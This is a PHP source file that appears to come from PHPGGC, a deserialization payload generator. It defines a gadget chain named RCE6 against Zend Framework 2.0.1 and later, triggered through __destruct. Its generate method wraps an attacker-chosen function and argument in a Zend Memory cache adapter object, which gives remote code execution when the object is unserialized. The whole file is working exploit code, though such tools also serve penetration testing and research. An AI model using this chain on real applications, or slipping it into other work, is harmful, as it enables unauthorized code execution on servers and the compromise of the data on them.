<?php

namespace GadgetChain\ZendFramework;

class RCE6 extends \PHPGGC\GadgetChain\RCE\FunctionCall
{
    public static $version = '2.0.1 <= ?';
    public static $vector = '__destruct';
    public static $author = 'CyanM0un';

    public function generate(array $parameters)
    {
        $function = $parameters["function"];
        $parameter = $parameters["parameter"];

        return new \Zend\Cache\Storage\Adapter\Memory($function, $parameter);
    }
}
